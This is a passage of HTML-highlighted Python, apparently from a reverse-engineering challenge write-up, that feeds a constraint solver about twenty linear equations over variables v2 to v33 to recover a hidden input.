class="line">           + <span class="number">106</span> * v30</span><br><span class="line">           + <span class="number">217</span> * v29</span><br><span class="line">           + <span class="number">226</span> * v28</span><br><span class="line">           + <span class="number">193</span> * v27</span><br><span class="line">           + <span class="number">193</span> * v26</span><br><span class="line">           + <span class="number">23</span> * v25</span><br><span class="line">           + <span class="number">72</span> * v24</span><br><span class="line">           + <span class="number">117</span> * v23</span><br><span class="line">           + <span class="number">208</span> * (v20 + v12 + v19)</span><br><span class="line">           + <span class="number">58</span> * v22</span><br><span class="line">           + <span class="number">62</span> * v21</span><br><span class="line">           + <span class="number">51</span> * v18</span><br><span class="line">           + <span class="number">95</span> * v17</span><br><span class="line">           + <span class="number">102</span> * v16</span><br><span class="line">           + <span class="number">155</span> * v15</span><br><span class="line">           + <span class="number">149</span> * v14</span><br><span class="line">           + <span class="number">240</span> * v13</span><br><span class="line">           + <span class="number">46</span> * v11</span><br><span class="line">           + <span class="number">199</span> * v10</span><br><span class="line">           + <span class="number">156</span> * v9</span><br><span class="line">           + <span class="number">248</span> * v8</span><br><span class="line">           + <span class="number">104</span> * v7</span><br><span class="line">           + <span class="number">252</span> * v6</span><br><span class="line">           + <span class="number">203</span> * v5</span><br><span class="line">           + <span class="number">81</span> * v4</span><br><span class="line">           + <span class="number">196</span> * v3</span><br><span class="line">           + <span class="number">43</span> * v2 == <span class="number">428661</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">112</span> * v33</span><br><span class="line">           + <span class="number">122</span> * v32</span><br><span class="line">           + <span class="number">105</span> * v31</span><br><span class="line">           + <span class="number">216</span> * v30</span><br><span class="line">           + <span class="number">125</span> * v29</span><br><span class="line">           + <span class="number">135</span> * v28</span><br><span class="line">           + <span class="number">220</span> * v27</span><br><span class="line">           + <span class="number">211</span> * v26</span><br><span class="line">           + <span class="number">65</span> * v25</span><br><span class="line">           + <span class="number">111</span> * v24</span><br><span class="line">           + <span class="number">75</span> * v23</span><br><span class="line">           + <span class="number">158</span> * v22</span><br><span class="line">           + <span class="number">180</span> * v21</span><br><span class="line">           + <span class="number">201</span> * v20</span><br><span class="line">           + <span class="number">67</span> * v19</span><br><span class="line">           + <span class="number">38</span> * v18</span><br><span class="line">           + <span class="number">208</span> * v17</span><br><span class="line">           + <span class="number">165</span> * v16</span><br><span class="line">           + <span class="number">136</span> * v15</span><br><span class="line">           + <span class="number">24</span> * v14</span><br><span class="line">           + <span class="number">152</span> * v13</span><br><span class="line">           + <span class="number">214</span> * v12</span><br><span class="line">           + <span class="number">10</span> * v11</span><br><span class="line">           + <span class="number">15</span> * v10</span><br><span class="line">           + <span class="number">83</span> * v9</span><br><span class="line">           + <span class="number">225</span> * v8</span><br><span class="line">           + <span class="number">107</span> * v7</span><br><span class="line">           + <span class="number">224</span> * v6</span><br><span class="line">           + <span class="number">144</span> * v5</span><br><span class="line">           + <span class="number">69</span> * v4</span><br><span class="line">           + <span class="number">49</span> * v3</span><br><span class="line">           + <span class="number">80</span> * v2 == <span class="number">371484</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">8</span> * v33</span><br><span class="line">           + <span class="number">205</span> * v32</span><br><span class="line">           + <span class="number">251</span> * v31</span><br><span class="line">           + <span class="number">90</span> * v30</span><br><span class="line">           + <span class="number">195</span> * v29</span><br><span class="line">           + <span class="number">74</span> * v28</span><br><span class="line">           + <span class="number">152</span> * (v8 + v26)</span><br><span class="line">           + <span class="number">95</span> * v27</span><br><span class="line">           + <span class="number">75</span> * v25</span><br><span class="line">           + <span class="number">109</span> * v24</span><br><span class="line">           + <span class="number">132</span> * v23</span><br><span class="line">           + <span class="number">58</span> * v22</span><br><span class="line">           + <span class="number">233</span> * v21</span><br><span class="line">           + <span class="number">63</span> * v20</span><br><span class="line">           + <span class="number">71</span> * v19</span><br><span class="line">           + <span class="number">99</span> * v18</span><br><span class="line">           + <span class="number">177</span> * v17</span><br><span class="line">           + <span class="number">190</span> * v16</span><br><span class="line">           + <span class="number">166</span> * v15</span><br><span class="line">           + <span class="number">178</span> * v14</span><br><span class="line">           + <span class="number">107</span> * v13</span><br><span class="line">           + <span class="number">149</span> * v12</span><br><span class="line">           + <span class="number">9</span> * v11</span><br><span class="line">           + <span class="number">153</span> * v10</span><br><span class="line">           + <span class="number">88</span> * v9</span><br><span class="line">           + <span class="number">51</span> * v7</span><br><span class="line">           + <span class="number">127</span> * v6</span><br><span class="line">           + <span class="number">143</span> * v5</span><br><span class="line">           + <span class="number">68</span> * v4</span><br><span class="line">           + <span class="number">129</span> * v3</span><br><span class="line">           + <span class="number">76</span> * v2 == <span class="number">350848</span>)</span><br><span class="line"></span><br><span class="line">    s.add(  <span class="number">128</span>* v33</span><br><span class="line">           + <span class="number">43</span> * v32</span><br><span class="line">           + <span class="number">97</span> * v31</span><br><span class="line">           + <span class="number">253</span> * v30</span><br><span class="line">           + <span class="number">183</span> * (v15 + v28)</span><br><span class="line">           + <span class="number">156</span> * v29</span><br><span class="line">           + <span class="number">86</span> * v27</span><br><span class="line">           + <span class="number">5</span> * v26</span><br><span class="line">           + <span class="number">219</span> * v25</span><br><span class="line">           + <span class="number">88</span> * v24</span><br><span class="line">           + <span class="number">30</span> * v23</span><br><span class="line">           + <span class="number">163</span> * v22</span><br><span class="line">           + <span class="number">123</span> * v21</span><br><span class="line">           + <span class="number">133</span> * v20</span><br><span class="line">           + <span class="number">95</span> * v19</span><br><span class="line">           + <span class="number">161</span> * v18</span><br><span class="line">           + <span class="number">126</span> * v17</span><br><span class="line">           + <span class="number">26</span> * v16</span><br><span class="line">           + <span class="number">177</span> * v14</span><br><span class="line">           + <span class="number">202</span> * v13</span><br><span class="line">           + <span class="number">67</span> * v12</span><br><span class="line">           + <span class="number">245</span> * v11</span><br><span class="line">           + <span class="number">182</span> * v10</span><br><span class="line">           + <span class="number">56</span> * v9</span><br><span class="line">           + <span class="number">40</span> * v8</span><br><span class="line">           + <span class="number">38</span> * v7</span><br><span class="line">           + <span class="number">59</span> * v6</span><br><span class="line">           + <span class="number">209</span> * v5</span><br><span class="line">           + <span class="number">146</span> * v4</span><br><span class="line">           + <span class="number">102</span> * v3</span><br><span class="line">           + <span class="number">31</span> * v2 == <span class="number">334408</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">39</span> * v33</span><br><span class="line">           + <span class="number">145</span> * v32</span><br><span class="line">           + <span class="number">247</span> * v31</span><br><span class="line">           + <span class="number">7</span> * v30</span><br><span class="line">           + <span class="number">152</span> * v29</span><br><span class="line">           + <span class="number">251</span> * v28</span><br><span class="line">           + <span class="number">159</span> * v27</span><br><span class="line">           + <span class="number">5</span> * v26</span><br><span class="line">           + <span class="number">42</span> * v25</span><br><span class="line">           + <span class="number">154</span> * v24</span><br><span class="line">           + <span class="number">178</span> * v23</span><br><span class="line">           + <span class="number">200</span> * v22</span><br><span class="line">           + <span class="number">49</span> * v21</span><br><span class="line">           + <span class="number">192</span> * v20</span><br><span class="line">           + <span class="number">170</span> * v19</span><br><span class="line">           + <span class="number">142</span> * v18</span><br><span class="line">           + <span class="number">171</span> * v17</span><br><span class="line">           + <span class="number">20</span> * v16</span><br><span class="line">           + <span class="number">128</span> * v15</span><br><span class="line">           + <span class="number">22</span> * v14</span><br><span class="line">           + <span class="number">17</span> * v13</span><br><span class="line">           + <span class="number">77</span> * v12</span><br><span class="line">           + <span class="number">92</span> * v11</span><br><span class="line">           + <span class="number">170</span> * v10</span><br><span class="line">           + <span class="number">155</span> * v9</span><br><span class="line">           + <span class="number">226</span> * v8</span><br><span class="line">           + <span class="number">228</span> * v7</span><br><span class="line">           + <span class="number">137</span> * v6</span><br><span class="line">           + <span class="number">146</span> * v5</span><br><span class="line">           + <span class="number">223</span> * v4</span><br><span class="line">           + <span class="number">136</span> * v3</span><br><span class="line">          +<span class="number">91</span> * v2 == <span class="number">382822</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">226</span> * v33</span><br><span class="line">           + <span class="number">84</span> * v32</span><br><span class="line">           + <span class="number">152</span> * v31</span><br><span class="line">           + <span class="number">56</span> * v30</span><br><span class="line">           + <span class="number">104</span> * v29</span><br><span class="line">           + <span class="number">108</span> * v28</span><br><span class="line">           + <span class="number">224</span> * v27</span><br><span class="line">           + <span class="number">220</span> * v26</span><br><span class="line">           + <span class="number">192</span> * v25</span><br><span class="line">           + <span class="number">173</span> * v24</span><br><span class="line">           + <span class="number">231</span> * v23</span><br><span class="line">           + <span class="number">13</span> * v22</span><br><span class="line">           + <span class="number">80</span> * v21</span><br><span class="line">           + <span class="number">116</span> * v20</span><br><span class="line">           + <span class="number">219</span> * v19</span><br><span class="line">           + <span class="number">123</span> * v18</span><br><span class="line">           + <span class="number">195</span> * v17</span><br><span class="line">           + <span class="number">82</span> * v16</span><br><span class="line">           + <span class="number">197</span> * v15</span><br><span class="line">           + v14</span><br><span class="line">           + <span class="number">47</span> * v13</span><br><span class="line">           + <span class="number">149</span> * v12</span><br><span class="line">           + <span class="number">221</span> * v10</span><br><span class="line">           + <span class="number">134</span> * v9</span><br><span class="line">           + <span class="number">77</span> * v8</span><br><span class="line">           + <span class="number">26</span> * v7</span><br><span class="line">           + <span class="number">244</span> * v6</span><br><span class="line">           + <span class="number">169</span> * v5</span><br><span class="line">           + <span class="number">204</span> * v4</span><br><span class="line">           + <span class="number">205</span> * (v11 + v3)</span><br><span class="line">           + <span class="number">121</span> * v2 == <span class="number">420160</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">85</span> * v33</span><br><span class="line">           + <span class="number">39</span> * v32</span><br><span class="line">           + <span class="number">150</span> * v31</span><br><span class="line">           + <span class="number">48</span> * v30</span><br><span class="line">           + <span class="number">204</span> * v29</span><br><span class="line">           + <span class="number">245</span> * v28</span><br><span class="line">           + <span class="number">21</span> * v27</span><br><span class="line">           + <span class="number">194</span> * v26</span><br><span class="line">           + <span class="number">252</span>*v25</span><br><span class="line">           + <span class="number">70</span> * v24</span><br><span class="line">           + <span class="number">219</span> * v23</span><br><span class="line">           + <span class="number">92</span> * v22</span><br><span class="line">           + <span class="number">67</span> * v21</span><br><span class="line">           + <span class="number">118</span> * (v8 + v20)</span><br><span class="line">           + <span class="number">111</span> * v19</span><br><span class="line">           + <span class="number">126</span> * (v7 + v18)</span><br><span class="line">           + <span class="number">182</span> * v17</span><br><span class="line">           + <span class="number">171</span> * v16</span><br><span class="line">           + <span class="number">184</span> * v15</span><br><span class="line">           + <span class="number">233</span> * v14</span><br><span class="line">           + <span class="number">83</span> * v13</span><br><span class="line">           + <span class="number">215</span> * v12</span><br><span class="line">           + <span class="number">171</span> * v11</span><br><span class="line">           + <span class="number">142</span> * v10</span><br><span class="line">           + <span class="number">161</span> * v9</span><br><span class="line">           + <span class="number">176</span> * v6</span><br><span class="line">           + <span class="number">184</span> * v5</span><br><span class="line">           + <span class="number">45</span> * v4</span><br><span class="line">           + <span class="number">95</span> * v3</span><br><span class="line">           + <span class="number">73</span> * v2 == <span class="number">402263</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">169</span> * v33</span><br><span class="line">           + <span class="number">202</span> * v32</span><br><span class="line">           + <span class="number">250</span> * v31</span><br><span class="line">           + <span class="number">175</span> * v30</span><br><span class="line">           + <span class="number">195</span> * v29</span><br><span class="line">           + <span class="number">154</span> * v28</span><br><span class="line">           + <span class="number">204</span> * v27</span><br><span class="line">           + <span class="number">140</span> * v26</span><br><span class="line">           + <span class="number">112</span> * v25</span><br><span class="line">           + <span class="number">145</span> * v24</span><br><span class="line">           + <span class="number">40</span> * v23</span><br><span class="line">           + <span class="number">84</span> * v22</span><br><span class="line">           + <span class="number">216</span> * v21</span><br><span class="line">           + <span class="number">111</span> * v20</span><br><span class="line">           + <span class="number">15</span> * v19</span><br><span class="line">           + <span class="number">238</span> * v18</span><br><span class="line">           + <span class="number">72</span> * v17</span><br><span class="line">           + <span class="number">75</span> * v16</span><br><span class="line">           + <span class="number">167</span> * v15</span><br><span class="line">           + <span class="number">34</span> * v14</span><br><span class="line">           + <span class="number">50</span> * v13</span><br><span class="line">           + <span class="number">19</span> * v12</span><br><span class="line">           + <span class="number">94</span> * v11</span><br><span class="line">           + <span class="number">191</span> * v10</span><br><span class="line">           + <span class="number">3</span> * v9</span><br><span class="line">           + <span class="number">92</span> * v8</span><br><span class="line">           + <span class="number">138</span> * v7</span><br><span class="line">           + <span class="number">164</span> * v6</span><br><span class="line">           + <span class="number">48</span> * v5</span><br><span class="line">           + <span class="number">224</span> * v4</span><br><span class="line">           + <span class="number">120</span> * v3</span><br><span class="line">           + <span class="number">170</span> * v2 == <span class="number">366968</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">176</span> * v33</span><br><span class="line">           + <span class="number">106</span> * v32</span><br><span class="line">           + <span class="number">25</span> * v31</span><br><span class="line">           + <span class="number">246</span> * v30</span><br><span class="line">           + <span class="number">144</span> * v29</span><br><span class="line">           + <span class="number">172</span> * (v17 + v28)</span><br><span class="line">           + <span class="number">243</span> * v27</span><br><span class="line">           + <span class="number">213</span> * v26</span><br><span class="line">           + <span class="number">147</span> * v25</span><br><span class="line">           + <span class="number">128</span>* v24</span><br><span class="line">           + <span class="number">183</span> * v23</span><br><span class="line">           + <span class="number">149</span> * v22</span><br><span class="line">           + <span class="number">247</span> * v21</span><br><span class="line">           + <span class="number">63</span> * v20</span><br><span class="line">           + <span class="number">254</span> * v19</span><br><span class="line">           + <span class="number">96</span> * v18</span><br><span class="line">           + <span class="number">23</span> * v16</span><br><span class="line">           + <span class="number">4</span> * v15</span><br><span class="line">           + <span class="number">19</span> * (v4 + v14)</span><br><span class="line">           + <span class="number">56</span> * v13</span><br><span class="line">           + <span class="number">139</span> * v12</span><br><span class="line">           + <span class="number">5</span> * v11</span><br><span class="line">           + <span class="number">164</span> * v10</span><br><span class="line">           + <span class="number">240</span> * v9</span><br><span class="line">           + <span class="number">247</span> * v8</span><br><span class="line">           + <span class="number">50</span> * v7</span><br><span class="line">           + <span class="number">112</span> * v5</span><br><span class="line">           + <span class="number">189</span> * v6</span><br><span class="line">           + <span class="number">68</span> * v3</span><br><span class="line">           + <span class="number">170</span> * v2 == <span class="number">384909</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">248</span> * v33</span><br><span class="line">           + <span class="number">78</span> * v32</span><br><span class="line">           + <span class="number">136</span> * v31</span><br><span class="line">           + <span class="number">27</span> * v30</span><br><span class="line">           + <span class="number">125</span> * v29</span><br><span class="line">           + <span class="number">93</span> * v27</span><br><span class="line">           + <span class="number">148</span> * v26</span><br><span class="line">           + <span class="number">252</span> * v25</span><br><span class="line">           + <span class="number">241</span> * v24</span><br><span class="line">           + <span class="number">223</span> * (v20 + v23)</span><br><span class="line">           + <span class="number">253</span> * v22</span><br><span class="line">           + <span class="number">156</span> * v21</span><br><span class="line">           + v19</span><br><span class="line">           + <span class="number">211</span> * v18</span><br><span class="line">           + <span class="number">174</span> * (v9 + v17)</span><br><span class="line">           + <span class="number">186</span> * v16</span><br><span class="line">           + <span class="number">170</span> * v15</span><br><span class="line">           + <span class="number">74</span> * v14</span><br><span class="line">           + <span class="number">159</span> * v13</span><br><span class="line">           + <span class="number">65</span> * v12</span><br><span class="line">           + <span class="number">113</span> * v11</span><br><span class="line">           + <span class="number">227</span> * v10</span><br><span class="line">           + <span class="number">149</span> * v8</span><br><span class="line">           + <span class="number">128</span> * v7</span><br><span class="line">           + <span class="number">183</span> * v6</span><br><span class="line">           + <span class="number">184</span> * v5</span><br><span class="line">           + <span class="number">22</span> * v4</span><br><span class="line">           + <span class="number">41</span> * (v28 + v2)</span><br><span class="line">           + <span class="number">31</span> * v3 == <span class="number">425203</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">113</span> * v33</span><br><span class="line">           + <span class="number">13</span> * v32</span><br><span class="line">           + <span class="number">243</span> * v31</span><br><span class="line">           + <span class="number">198</span> * v30</span><br><span class="line">           + <span class="number">118</span> * v29</span><br><span class="line">           + <span class="number">105</span> * (v11 + v28)</span><br><span class="line">           + <span class="number">27</span> * v27</span><br><span class="line">           + <span class="number">186</span> * v26</span><br><span class="line">           + <span class="number">212</span> * v25</span><br><span class="line">           + <span class="number">142</span> * v24</span><br><span class="line">           + <span class="number">170</span> * v23</span><br><span class="line">           + <span class="number">10</span> * (v7 + v22)</span><br><span class="line">           + <span class="number">140</span> * (v18 + v21)</span><br><span class="line">           + <span class="number">197</span> * v20</span><br><span class="line">           + <span class="number">181</span> * v19</span><br><span class="line">           + <span class="number">75</span> * v17</span><br><span class="line">           + <span class="number">208</span> * v16</span><br><span class="line">           + <span class="number">155</span> * v15</span><br><span class="line">           + <span class="number">46</span> * v14</span><br><span class="line">           + <span class="number">43</span> * v13</span><br><span class="line">           + <span class="number">3</span> * v12</span><br><span class="line">           + <span class="number">239</span> * v10</span><br><span class="line">           + <span class="number">99</span> * v9</span><br><span class="line">           + <span class="number">145</span> * v8</span><br><span class="line">           + <span class="number">242</span> * v6</span><br><span class="line">           + <span class="number">155</span> * v5</span><br><span class="line">           + <span class="number">237</span> * v4</span><br><span class="line">           + <span class="number">39</span> * v3</span><br><span class="line">           + <span class="number">82</span> * v2 == <span class="number">372162</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">6</span> * v33</span><br><span class="line">           + <span class="number">87</span> * (v9 + v31)</span><br><span class="line">           + <span class="number">45</span> * v32</span><br><span class="line">           + <span class="number">3</span> * v30</span><br><span class="line">           + <span class="number">19</span> * v29</span><br><span class="line">           + <span class="number">94</span> * v28</span><br><span class="line">           + <span class="number">159</span> * v26</span><br><span class="line">           + <span class="number">229</span> * v25</span><br><span class="line">           + <span class="number">76</span> * v24</span><br><span class="line">           + <span class="number">199</span> * v23</span><br><span class="line">           + <span class="number">139</span> * v22</span><br><span class="line">           + <span class="number">36</span> * v21</span><br><span class="line">           + <span class="number">240</span> * v20</span><br><span class="line">           + <span class="number">72</span> * v19</span><br><span class="line">           + <span class="number">68</span> * v18</span><br><span class="line">           + <span class="number">185</span> * v17</span><br><span class="line">           + <span class="number">202</span> * v16</span><br><span class="line">           + <span class="number">96</span> * v15</span><br><span class="line">           + <span class="number">40</span> * v14</span><br><span class="line">           + <span class="number">180</span> * v13</span><br><span class="line">           + <span class="number">63</span> * v12</span><br><span class="line">           + <span class="number">17</span> * v11</span><br><span class="line">           + <span class="number">7</span> * v10</span><br><span class="line">           + <span class="number">91</span> * v8</span><br><span class="line">           + <span class="number">58</span> * v7</span><br><span class="line">           + <span class="number">127</span> * v6</span><br><span class="line">           + <span class="number">207</span> * v5</span><br><span class="line">           + <span class="number">206</span> * v4</span><br><span class="line">           + <span class="number">136</span> * (v27 + v2)</span><br><span class="line">           + <span class="number">50</span> * v3 == <span class="number">297509</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">184</span> * v33</span><br><span class="line">           + <span class="number">153</span> * v32</span><br><span class="line">           + <span class="number">245</span> * v31</span><br><span class="line">           + <span class="number">235</span> * (v12 + v28)</span><br><span class="line">           + v30</span><br><span class="line">           + <span class="number">108</span> * v29</span><br><span class="line">           + <span class="number">144</span> * v27</span><br><span class="line">           + <span class="number">221</span> * v26</span><br><span class="line">           + <span class="number">200</span> * v25</span><br><span class="line">           + <span class="number">35</span> * v24</span><br><span class="line">           + <span class="number">138</span> * v23</span><br><span class="line">           + <span class="number">38</span> * v22</span><br><span class="line">           + <span class="number">172</span> * v21</span><br><span class="line">           + <span class="number">9</span> * v20</span><br><span class="line">           + <span class="number">123</span> * v19</span><br><span class="line">           + <span class="number">63</span> * v18</span><br><span class="line">           + <span class="number">218</span> * v17</span><br><span class="line">           + <span class="number">204</span> * v16</span><br><span class="line">           + <span class="number">76</span> * v15</span><br><span class="line">           + <span class="number">114</span> * v14</span><br><span class="line">           + <span class="number">149</span> * v13</span><br><span class="line">           + <span class="number">202</span> * v11</span><br><span class="line">           + <span class="number">74</span> * v10</span><br><span class="line">           + <span class="number">83</span> * v9</span><br><span class="line">           + <span class="number">87</span> * v8</span><br><span class="line">           + <span class="number">166</span> * v7</span><br><span class="line">           + <span class="number">40</span> * v6</span><br><span class="line">           + <span class="number">115</span> * v5</span><br><span class="line">           + <span class="number">215</span> * v4</span><br><span class="line">           + <span class="number">12</span> * v3</span><br><span class="line">           + <span class="number">90</span> * v2 == <span class="number">372215</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">143</span> * v33</span><br><span class="line">           + <span class="number">248</span> * v32</span><br><span class="line">           + <span class="number">224</span> * v31</span><br><span class="line">           + <span class="number">28</span> * v30</span><br><span class="line">           + <span class="number">122</span> * v29</span><br><span class="line">           + <span class="number">144</span> * v28</span><br><span class="line">           + <span class="number">12</span> * v27</span><br><span class="line">           + <span class="number">85</span> * (v15 + v25)</span><br><span class="line">           + <span class="number">196</span> * v26</span><br><span class="line">           + <span class="number">77</span> * v24</span><br><span class="line">           + <span class="number">150</span> * v23</span><br><span class="line">           + <span class="number">179</span> * v22</span><br><span class="line">           + <span class="number">240</span> * v21</span><br><span class="line">           + <span class="number">225</span> * v20</span><br><span class="line">           + <span class="number">62</span> * v19</span><br><span class="line">           + <span class="number">142</span> * v18</span><br><span class="line">           + <span class="number">187</span> * v17</span><br><span class="line">           + <span class="number">190</span> * v16</span><br><span class="line">           + <span class="number">94</span> * v14</span><br><span class="line">           + <span class="number">3</span> * v13</span><br><span class="line">           + <span class="number">61</span> * v12</span><br><span class="line">           + <span class="number">116</span> * v11</span><br><span class="line">           + <span class="number">81</span> * v10</span><br><span class="line">           + <span class="number">231</span> * v9</span><br><span class="line">           + <span class="number">84</span> * v8</span><br><span class="line">           + <span class="number">180</span> * v7</span><br><span class="line">           + <span class="number">55</span> * v6</span><br><span class="line">           + <span class="number">123</span> * v5</span><br><span class="line">           + <span class="number">190</span> * v4</span><br><span class="line">           + <span class="number">36</span> * v3</span><br><span class="line">           + <span class="number">114</span> * v2 == <span class="number">370337</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">91</span> * v33</span><br><span class="line">           + <span class="number">204</span> * v32</span><br><span class="line">           + <span class="number">201</span> * v31</span><br><span class="line">           + <span class="number">7</span> * v30</span><br><span class="line">           + <span class="number">158</span> * (v17 + v28)</span><br><span class="line">           + <span class="number">103</span> * v29</span><br><span class="line">           + <span class="number">95</span> * v27</span><br><span class="line">           + <span class="number">76</span> * v26</span><br><span class="line">           + <span class="number">189</span> * v25</span><br><span class="line">           + <span class="number">32</span> * v24</span><br><span class="line">           + <span class="number">70</span> * v23</span><br><span class="line">           + <span class="number">74</span> * v22</span><br><span class="line">           + <span class="number">116</span> * v21</span><br><span class="line">           + <span class="number">80</span> * v20</span><br><span class="line">           + <span class="number">191</span> * v19</span><br><span class="line">           + <span class="number">14</span> * v18</span><br><span class="line">           + <span class="number">30</span> * (v10 + v16)</span><br><span class="line">           + <span class="number">176</span> * v14</span><br><span class="line">           + <span class="number">213</span> * v13</span><br><span class="line">           + <span class="number">13</span> * v12</span><br><span class="line">           + <span class="number">241</span> * v11</span><br><span class="line">           + <span class="number">65</span> * v9</span><br><span class="line">           + <span class="number">154</span> * v8</span><br><span class="line">           + <span class="number">224</span> * v7</span><br><span class="line">           + <span class="number">40</span> * v6</span><br><span class="line">           + <span class="number">2</span> * v5</span><br><span class="line">           + <span class="number">202</span> * v4</span><br><span class="line">           + <span class="number">122</span> * (v15 + v3)</span><br><span class="line">           + <span class="number">190</span> * v2 == <span class="number">314564</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">44</span> * v33</span><br><span class="line">           + <span class="number">88</span> * v32</span><br><span class="line">           + <span class="number">66</span> * v31</span><br><span class="line">           + <span class="number">248</span> * v30</span><br><span class="line">           + <span class="number">160</span> * v29</span><br><span class="line">           + <span class="number">118</span> * v28</span><br><span class="line">           + <span class="number">31</span> * v27</span><br><span class="line">           + <span class="number">83</span> * (v20 + v25)</span><br><span class="line">           + <span class="number">27</span> * v26</span><br><span class="line">           + <span class="number">115</span> * v24</span><br><span class="line">           + <span class="number">30</span> * v23</span><br><span class="line">           + <span class="number">67</span> * v22</span><br><span class="line">           + <span class="number">162</span> * v21</span><br><span class="line">           + <span class="number">202</span> * v19</span><br><span class="line">           + <span class="number">205</span> * v18</span><br><span class="line">           + <span class="number">89</span> * v17</span><br><span class="line">           + <span class="number">110</span> * v16</span><br><span class="line">           + <span class="number">199</span> * v15</span><br><span class="line">           + <span class="number">158</span> * v14</span><br><span class="line">           + <span class="number">14</span> * v13</span><br><span class="line">           + <span class="number">253</span> * v12</span><br><span class="line">           + <span class="number">95</span> * v11</span><br><span class="line">           + <span class="number">75</span> * v10</span><br><span class="line">           + <span class="number">101</span> * v9</span><br><span class="line">           + <span class="number">155</span> * v8</span><br><span class="line">           + <span class="number">165</span> * v7</span><br><span class="line">           + <span class="number">223</span> * v6</span><br><span class="line">           + <span class="number">42</span> * v5</span><br><span class="line">           + <span class="number">154</span> * v4</span><br><span class="line">           + <span class="number">176</span> * v3</span><br><span class="line">           + <span class="number">5</span> * v2 ==<span class="number">325974</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">65</span> * v33</span><br><span class="line">           + <span class="number">72</span> * (v6 + v32)</span><br><span class="line">           + <span class="number">111</span> * v31</span><br><span class="line">           + <span class="number">207</span> * v30</span><br><span class="line">           + <span class="number">29</span> * (v11 + v29)</span><br><span class="line">           + <span class="number">208</span> * (v18 + v27)</span><br><span class="line">           + <span class="number">5</span> * v28</span><br><span class="line">           + <span class="number">163</span> * v26</span><br><span class="line">           + <span class="number">123</span> * v25</span><br><span class="line">           + <span class="number">38</span> * v24</span><br><span class="line">           + <span class="number">34</span> * v23</span><br><span class="line">           + <span class="number">35</span> * v22</span><br><span class="line">           + <span class="number">114</span> * v21</span><br><span class="line">           + <span class="number">140</span> * v19</span><br><span class="line">           + <span class="number">150</span> * v17</span><br><span class="line">           + <span class="number">10</span> * v16</span><br><span class="line">           + <span class="number">180</span> * v15</span><br><span class="line">           + <span class="number">185</span> * v14</span><br><span class="line">           + <span class="number">235</span> * v13</span><br><span class="line">           + <span class="number">62</span> * v12</span><br><span class="line">           + <span class="number">146</span> * v10</span><br><span class="line">           + <span class="number">41</span> * v9</span><br><span class="line">           + <span class="number">243</span> * v8</span><br><span class="line">           + <span class="number">160</span> * v7</span><br><span class="line">           + <span class="number">34</span> * v5</span><br><span class="line">           + <span class="number">168</span> * v4</span><br><span class="line">           + <span class="number">125</span> * (v20 + v2)</span><br><span class="line">           + <span class="number">84</span> * v3 == <span class="number">307088</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">188</span> * v33</span><br><span class="line">           + <span class="number">243</span> * v32</span><br><span class="line">           + <span class="number">21</span> * (v12 + v31)</span><br><span class="line">           + <span class="number">127</span> * v30</span><br><span class="line">           + <span class="number">155</span> * v29</span><br><span class="line">           + <span class="number">26</span> * (v6 + v28)</span><br><span class="line">           + <span class="number">97</span> * (v20 + v27)</span><br><span class="line">           + <span class="number">177</span> * v26</span><br><span class="line">           + <span class="number">167</span> * v25</span><br><span class="line">           + <span class="number">78</span> * v24</span><br><span class="line">           + <span class="number">152</span> * v23</span><br><span class="line">           + <span class="number">162</span> * v22</span><br><span class="line">           + <span class="number">7</span> * v21</span><br><span class="line">           + <span class="number">178</span> * v19</span><br><span class="line">           + <span class="number">171</span> * v18</span><br><span class="line">           + <span class="number">16</span> * v17</span><br><span class="line">           + <span class="number">67</span> * v16</span><br><span class="line">           + <span class="number">213</span> * v15</span><br><span class="line">           + <span class="number">253</span> * v14</span><br><span class="line">           + <span class="number">116</span> * v13</span><br><span class="line">           + <span class="number">100</span> * v11</span><br><span class="line">           + <span class="number">32</span> * v10</span><br><span class="line">           + <span class="number">128</span> * v9</span><br><span class="line">           + <span class="number">44</span> * v8</span><br><span class="line">           + <span class="number">175</span> * v7</span><br><span class="line">           + <span class="number">18</span> * v5</span><br><span class="line">           + <span class="number">11</span> * v4</span><br><span class="line">           + <span class="number">197</span> * v3</span><br><span class="line">           + <span class="number">140</span> * v2 == <span class="number">322340</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">113</span> * v33</span><br><span class="line">           + <span class="number">252</span> * v32</span><br><span class="line">           + <span class="number">193</span> * v30</span><br><span class="line">           + <span class="number">90</span> * v29</span><br><span class="line">           + <span class="number">242</span> * v28</span><br><span class="line">           + <span class="number">138</span> * v27</span><br><span class="line">           + <span class="number">193</span> * v26</span><br><span class="line">           + <span class="number">183</span> * v25</span><br><span class="line">           + <span class="number">127</span> * (v21 + v23)</span><br><span class="line">           + <span class="number">244</span> * v24</span><br><span class="line">           + <span class="number">156</span> * v22</span><br><span class="line">           + <span class="number">233</span> * v20</span><br><span class="line">           + <span class="number">162</span> * v19</span><br><span class="line">           + <span class="number">89</span> * v18</span><br><span class="line">           + <span class="number">184</span> * v17</span><br><span class="line">           + <span class="number">91</span> * v16</span><br><span class="line">           + <span class="number">34</span> * v15</span><br><span class="line">           + <span class="number">51</span> * v14</span><br><span class="line">           + <span class="number">166</span> * v13</span><br><span class="line">           + <span class="number">179</span> * v12</span><br><span class="line">           + <span class="number">47</span> * v11</span><br><span class="line">           + <span class="number">9</span> * v10</span><br><span class="line">           + <span class="number">113</span> * v9</span><br><span class="line">           + <span class="number">72</span> * v8</span><br><span class="line">           + <span class="number">208</span> * v7</span><br><span class="line">           + <span class="number">164</span> * v6</span><br><span class="line">           + <span class="number">140</span> * v5</span><br><span class="line">           + <span class="number">110</span> * v4</span><br><span class="line">           + <span class="number">7</span> * (v31 + v3)</span><br><span class="line">           + <span class="number">152</span> * v2 == <span class="number">380716</span>)</span><br><span class="line"></span><br><span class="line">    